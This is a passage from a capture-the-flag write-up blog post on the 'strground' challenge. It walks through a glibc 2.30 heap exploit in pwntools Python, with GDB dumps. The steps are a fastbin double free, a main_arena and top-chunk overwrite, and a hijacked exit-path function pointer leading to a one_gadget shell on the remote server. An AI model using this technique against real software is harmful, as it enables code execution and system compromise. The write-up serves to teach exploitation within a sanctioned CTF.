<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  set *0x7ffff7dd0b95=0x56</code></pre></figure>

<p>This way, we can keep it easy with breakpoints but have the same behaviour as with ASLR.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># prepare double free
</span><span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>   <span class="c1"># 4
</span><span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>   <span class="c1"># 5
</span>
<span class="c1"># double free string 4
</span><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

<span class="c1"># overwrite freed fd to allocate into main_arena (use misaligned address to create valid size 0x56)
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3b4b8d</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># allocate two chunks, to get fake FD pointer into fastbin list
</span><span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
<span class="n">create</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>

<span class="c1"># set *0x7ffff7dd0b95=0x56
</span><span class="n">pause</span><span class="p">()</span></code></pre></figure>

<p>After this, we should have our fake <code class="language-plaintext highlighter-rouge">FD</code> in <code class="language-plaintext highlighter-rouge">main arena</code> fastbin list, so the next allocation of a <code class="language-plaintext highlighter-rouge">0x50</code> chunk would write into <code class="language-plaintext highlighter-rouge">main_arena</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x7ffff7dd0b50
0x7ffff7dd0b50:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0b60:	0x0000000000000000	0x0000000000000001
0x7ffff7dd0b70:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0b80:	0x0000000000000000	0x00007ffff7dd0b8d &lt;= 0x50 fastbin
0x7ffff7dd0b90:	0x0000555555603080	0x0000000000000000 &lt;= 0x60 fastbin
0x7ffff7dd0ba0:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bb0:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bc0:	0x00005555556031e0	0x0000000000000000
0x7ffff7dd0bd0:	0x00007ffff7dd0bc0	0x00007ffff7dd0bc0
0x7ffff7dd0be0:	0x00007ffff7dd0bd0	0x00007ffff7dd0bd0
gef➤  set *0x7ffff7dd0b95=0x56
gef➤  x/30gx 0x7ffff7dd0b80+13
0x7ffff7dd0b8d:	0x555560308000007f	0x0000000000000056
0x7ffff7dd0b9d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bad:	0x0000000000000000	0x0000000000000000
0x7ffff7dd0bbd:	0x55556031e0000000	0x0000000000000055</code></pre></figure>

<p>With everything prepared, we can now overwrite the <code class="language-plaintext highlighter-rouge">top</code> pointer with the next allocation, so now we should be game, just putting some address into top, easily putting a ropchain to stack or somewhere else…</p>

<p>But again… We have a <code class="language-plaintext highlighter-rouge">2.30</code> libc, which has some additional checks for the <code class="language-plaintext highlighter-rouge">top</code> chunk, like for example, that it need to have a valid <code class="language-plaintext highlighter-rouge">top</code> size (<code class="language-plaintext highlighter-rouge">&lt; 0x21000</code> and more), so we can <code class="language-plaintext highlighter-rouge">not</code> just point it <code class="language-plaintext highlighter-rouge">anywhere</code> :-/</p>

<p>Finding a good target for a fake <code class="language-plaintext highlighter-rouge">top</code> chunk took ages… First I tried to find a good <code class="language-plaintext highlighter-rouge">top</code> size on the stack, so that we could put a ropchain into the return of the <code class="language-plaintext highlighter-rouge">memcpy</code> function, but after some time I gave that up, since there didn’t seemed to be anything on the stack we could use (or it would have been overwritten after the allocation).</p>

<p>So, I went into debugging the <code class="language-plaintext highlighter-rouge">exit</code> function, with which we soon landed in <code class="language-plaintext highlighter-rouge">ld</code> land, which was a bit of a pain to debug, since we don’t have an <code class="language-plaintext highlighter-rouge">ld</code> with debug symbols at hand. But after a lot of time digging through it with gdb, we’ll land here</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe0b8  →  0x00007ffff7ffe730  →  0x00007ffff7ffa000  →  0x00010102464c457f
$rbx   : 0x00007ffff7ffd060  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$rcx   : 0x0               
$rdx   : 0x2               
$rsp   : 0x00007fffffffe0b0  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$rbp   : 0x00007fffffffe130  →  0x00007ffff7dd06f8  →  0x00007ffff7dd1c80  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007ffff7ffd968  →  0x0000000100000000
$rip   : 0x00007ffff7de5260  →  0x854500218d0215ff
$r8    : 0x0               
$r9    : 0x00007fffffffdff4  →  0x0000000000000001
$r10   : 0x2               
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x0               
$r14   : 0x00007fffffffe0b0  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$r15   : 0x4               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7de524f                  mov    ecx, 0x1
   0x7ffff7de5254                  call   0x7ffff7deb730
   0x7ffff7de5259                  lea    rdi, [rip+0x218708]        # 0x7ffff7ffd968
 → 0x7ffff7de5260                  call   QWORD PTR [rip+0x218d02]        # 0x7ffff7ffdf68
   0x7ffff7de5266                  test   r15d, r15d
   0x7ffff7de5269                  je     0x7ffff7de533e
   0x7ffff7de526f                  lea    eax, [r15-0x1]
   0x7ffff7de5273                  lea    rax, [r14+rax*8+0x8]
   0x7ffff7de5278                  mov    QWORD PTR [rbp-0x48], rax
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe0b0│+0x0000: 0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047	 ← $rsp, $r14
0x00007fffffffe0b8│+0x0008: 0x00007ffff7ffe730  →  0x00007ffff7ffa000  →  0x00010102464c457f	 ← $rax
0x00007fffffffe0c0│+0x0010: 0x00007ffff7ff4000  →  0x00007ffff7a1c000  →  0x03010102464c457f
0x00007fffffffe0c8│+0x0018: 0x00007ffff7ffd9e8  →  0x00007ffff7dd6000  →  0x00010102464c457f
0x00007fffffffe0d0│+0x0020: 0x0000000000000d68 ("h\r"?)
0x00007fffffffe0d8│+0x0028: 0x00007ffff7de518f  →  0x48ca74d28508538b
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x7ffff7ffdf68 (
   $rdi = 0x00007ffff7ffd968 → 0x0000000100000000,
   $rsi = 0x0000000000000000,
   $rdx = 0x0000000000000002,
   $rcx = 0x0000000000000000
)
─────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  x/30gx 0x7ffff7ffdf68-0x200
0x7ffff7ffdd68:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdd78:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdd88:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdd98:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdda8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffddb8:	0x0000000100000000	0x0000000000000000
0x7ffff7ffddc8:	0x0000000300000000	0x0000000000000000
0x7ffff7ffddd8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdde8:	0x00007ffff7dd6480	0x0000000000000001
0x7ffff7ffddf8:	0x00007ffff7ff4000	0x00007ffff7a211a8
0x7ffff7ffde08:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde18:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde28:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde38:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde48:	0x00000000002265a0	0x0000000000000a60  &lt;= possible top size??
gef➤  
0x7ffff7ffde58:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde68:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde78:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde88:	0x0000000000000000	0x0000000000000000
0x7ffff7ffde98:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdea8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdeb8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdec8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffded8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdee8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdef8:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdf08:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdf18:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdf28:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdf38:	0x0000000000000000	0x0000000000000000
gef➤  
0x7ffff7ffdf48:	0x0000000000000000	0x0000000000000000
0x7ffff7ffdf58:	0x0000000000000000	0x00007ffff7dd7200
0x7ffff7ffdf68:	0x00007ffff7dd7210	0x0000000000000000  &lt;= call target</code></pre></figure>

<p>As it turns out, <code class="language-plaintext highlighter-rouge">0xa60</code> <em>is</em> a good top chunk size. So we can overwrite <code class="language-plaintext highlighter-rouge">top</code> with <code class="language-plaintext highlighter-rouge">0x7ffff7ffde48</code> and then the next allocations will go there, increasing our fake <code class="language-plaintext highlighter-rouge">top chunk</code> until we can overwrite the function pointer, that gets called in the <code class="language-plaintext highlighter-rouge">ld</code> code.</p>

<p>Let’s try it out</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00\x00\x00</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x5e1e50</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3b4bc0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3b4bc0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3b4bd0</span><span class="p">)[:</span><span class="mi">5</span><span class="p">]</span>

<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<p>With this, we’ll have overwritten <code class="language-plaintext highlighter-rouge">top</code> to point to our fake <code class="language-plaintext highlighter-rouge">top</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<p>With some additional allocations, which go to our fake <code class="language-plaintext highlighter-rouge">top</code> chunk, we should now have overwritten the function pointer, that get’s called from <code class="language-plaintext highlighter-rouge">exit</code> handler.</p>

<p>Calling <code class="language-plaintext highlighter-rouge">EXIT</code> after this results in</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────── registers ────

$rax   : 0x00007ffff7ffd060  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$rbx   : 0x00007ffff7ffd060  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$rcx   : 0x1               
$rdx   : 0x00007ffff7de5120  →  0x56415741e5894855
$rsp   : 0x00007fffffffe0d8  →  0x00007ffff7de518f  →  0x48ca74d28508538b
$rbp   : 0x00007fffffffe130  →  0x00007ffff7dd06f8  →  0x00007ffff7dd1c80  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007ffff7ffd968  →  0x0000000000000000
$rip   : 0xdeadbee1        
$r8    : 0x00007ffff7ffdf48  →  0x4141414141414141 ("AAAAAAAA"?)
$r9    : 0x0               
$r10   : 0x00007fffffffb9b8  →  0x00007ffff7a9662e  →  0x830ff0394cc72949
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x1               
$r14   : 0x00007ffff7dd5308  →  0x0000000000000000
$r15   : 0x00007ffff7dd1c80  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe0d8│+0x0000: 0x00007ffff7de518f  →  0x48ca74d28508538b	 ← $rsp
0x00007fffffffe0e0│+0x0008: 0x0000000000000d68 ("h\r"?)
0x00007fffffffe0e8│+0x0010: 0x00007ffff7dcd420  →  0x0000000000000000
0x00007fffffffe0f0│+0x0018: 0x00007fff00000000
0x00007fffffffe0f8│+0x0020: 0x00007ffff7a9524f  →  0xb70fc48949c08548
0x00007fffffffe100│+0x0028: 0x000000000000000a ("\n"?)
[!] Cannot access memory at address 0xdeadbee1
─────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>Finally, <code class="language-plaintext highlighter-rouge">rip</code> control… But we have only one shot, and <code class="language-plaintext highlighter-rouge">one_gadget</code> constraints of the provided <code class="language-plaintext highlighter-rouge">libc</code> all won’t work at this point (<code class="language-plaintext highlighter-rouge">r12</code> and <code class="language-plaintext highlighter-rouge">r13</code> should be <code class="language-plaintext highlighter-rouge">0x0</code> for it.).</p>

<p>Let’s just put a <code class="language-plaintext highlighter-rouge">ret</code> there for now, to see where we’ll be going.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">RET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000b5b76</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe0b8  →  0x00007ffff7ffe730  →  0x00007ffff7ffa000  →  0x00010102464c457f
$rbx   : 0x00007ffff7ffd060  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$rcx   : 0x0               
$rdx   : 0x2               
$rsp   : 0x00007fffffffe0a8  →  0x00007ffff7de5266  →  0x0000cf840fff8545
$rbp   : 0x00007fffffffe130  →  0x00007ffff7dd06f8  →  0x00007ffff7dd1c80  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007ffff7ffd968  →  0x0000000000000000
$rip   : 0xdeadbee2        
$r8    : 0x0               
$r9    : 0x00007fffffffdff4  →  0x0000000000000001
$r10   : 0x2               
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x0               
$r14   : 0x00007fffffffe0b0  →  0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047
$r15   : 0x4               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe0a8│+0x0000: 0x00007ffff7de5266  →  0x0000cf840fff8545	 ← $rsp
0x00007fffffffe0b0│+0x0008: 0x00007ffff7ffe190  →  0x0000555555400000  →   jg 0x555555400047	 ← $r14
0x00007fffffffe0b8│+0x0010: 0x00007ffff7ffe730  →  0x00007ffff7ffa000  →  0x00010102464c457f	 ← $rax
0x00007fffffffe0c0│+0x0018: 0x00007ffff7ff4000  →  0x00007ffff7a1c000  →  0x03010102464c457f
0x00007fffffffe0c8│+0x0020: 0x00007ffff7ffd9e8  →  0x00007ffff7dd6000  →  0x00010102464c457f
0x00007fffffffe0d0│+0x0028: 0x0000000000000d68 ("h\r"?)
[!] Cannot access memory at address 0xdeadbee2
─────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>So, we hit our next <code class="language-plaintext highlighter-rouge">0xdeadbee2</code>, but this time <code class="language-plaintext highlighter-rouge">r12</code> and <code class="language-plaintext highlighter-rouge">r13</code> are <code class="language-plaintext highlighter-rouge">0x0</code>, which fulfills the constraints for the <code class="language-plaintext highlighter-rouge">one_gadget</code>, so let’s just put it there to finally end this :)</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">RET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000b5b76</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xc4dbf</span><span class="p">)</span>  <span class="c1"># one_gadget
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python2 work.py
[*] '/media/sf_ctf/unbreak/strground/source/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './chall': pid 3615
[3615]
[*] Paused (press any to continue)
[*] STACK leak     : 0x7fffffffe2ce
[*] LIBC leak      : 0x7ffff7dd5300
[*] LIBC           : 0x7ffff7a1c000
[*] PIE leak       : 0x5555554010ad
[*] HEAP leak      : 0x5555556030e0
[*] __malloc_hook  : 0x7ffff7dd0b50
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ EXIT
Exiting...
$ id
uid=1000(kileak) gid=1000(kileak)</code></pre></figure>

<p>Like already mentioned, for the exploit to work with <code class="language-plaintext highlighter-rouge">ASLR</code>, we might need to run it multiple times to get a heap address, that starts with <code class="language-plaintext highlighter-rouge">0x56</code>.</p>

<p>But after some runs against the remote challenge server, we should come to something like this</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/media/sf_ctf/unbreak/strground/source/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 35.234.88.19 on port 31273: Done
[*] STACK leak     : 0x7ffc4857e31e
[*] LIBC leak      : 0x7f55807a5300
[*] LIBC           : 0x7f55803ec000
[*] PIE leak       : 0x564a534010ad
[*] HEAP leak      : 0x564a53e4d0e0
[*] __malloc_hook  : 0x7f55807a0b50
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ ls
chall
flag.txt
ld-2.30.so
ld.so.2
libc-2.30.so
libc.so.6
strground.c
$ cat flag.txt
CTF{e4ab66d73bdc695ee3910c5b9ac133081434d1bbb92a26217871ea546d78218b}</code></pre></figure>

<p>That was an interesting challenge, having to deal with <code class="language-plaintext highlighter-rouge">2.30</code> heap hardening restrictions, without having access to <code class="language-plaintext highlighter-rouge">tcache</code> (avoiding all the usual cookie cutter solutions).</p>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=UNbreakable International 2024 - strground&amp;url=https://kileak.github.io/ctf/2024/unbreakable-strground-copy-2/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2024/unbreakable-strground-copy-2/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2024/unbreakable-strground copy 2';
        var disqus_title = 'UNbreakable International 2024 - strground';
        var disqus_url = 'https://kileak.github.io/ctf/2024/unbreakable-strground copy 2';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
